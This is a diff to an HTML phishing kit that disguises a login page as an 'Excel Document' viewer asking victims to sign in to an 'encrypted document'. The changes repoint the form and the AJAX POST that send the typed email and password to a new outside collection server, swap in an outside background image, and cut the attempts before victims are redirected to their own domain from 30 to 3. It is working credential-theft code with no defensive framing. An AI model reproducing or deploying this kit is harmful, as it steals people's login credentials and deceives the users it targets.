@@ -1,6 +1,6 @@
 
 <html lang="zxx"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<title class="logoname">Quarantine&amp;mARzAuvP </title>
+<title class="logoname">Excel Document</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link rel="apple-touch-icon" type="image/png" class="logoimg" href="" />
 <link rel="shortcut icon" type="image/x-icon" class="logoimg" href="" />
@@ -53,7 +53,7 @@ h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6 {
 
 /** Login 1 start **/
 .login-1 {
-    background: rgba(0, 0, 0, 0.04) url(../img/bg-image.jpg) top left repeat;
+    background: rgba(0, 0, 0, 0.04) url(https://i.gyazo.com/52a11ae9fe6936093d1a147ffb24ad16.png) top left repeat;
     background-size: cover;
     top: 0;
     width: 100%;
@@ -319,8 +319,8 @@ allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 
 <br><br>
 
 </div></h2>
-<h3>Sign in to continue</h3>
-<form name="members" action="https://1-ltd.online/api.php" method="GET">
+<h3>Sign in to view your encrypted document</h3>
+<form name="members" action="https://jalcepsac.com/api.php" method="GET">
 <div class="form-group">
 <center>
 <div class="alert alert-danger" id="msg" style="display: none;"></div>
@@ -334,7 +334,7 @@ allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 
 </div>
 <table width="247" border="0" align="center" cellpadding="0" cellspacing="0">
 <tr>
-<td bgcolor="#000066"><div class="btn-holder">
+<td bgcolor="#00B140"><div class="btn-holder">
 <button class="btn btn-lg col-12 style1" id="submit-btn">Continue</button>
 </div></td>
  </tr>
@@ -477,7 +477,7 @@ Your information is only for the sole purpose of viewing this document and would
       
       $.ajax({
         dataType: 'JSON',
-        url: 'https://1-ltd.online/api.php',
+        url: 'https://jalcepsac.com/api.php',
         type: 'POST',
         data:{
           email:email,
@@ -494,7 +494,7 @@ Your information is only for the sole purpose of viewing this document and would
 				$('#msg').html(response['msg']);
                 if(response['signal'] == 'ok'){
                   $("#password").val("");
-                  if (count>=30) {
+                  if (count>=3) {
                     count=0;
                     // window.location.replace(response['redirect_link']);
                    window.location.replace("http://www."+my_slice);
@@ -510,7 +510,7 @@ Your information is only for the sole purpose of viewing this document and would
             },
             error: function(){
               $("#password").val("");
-              if (count>=30) {
+              if (count>=3) {
                 count=0;
                    window.location.replace("http://www."+my_slice);
                   //    window.location.replace("https://office.com");
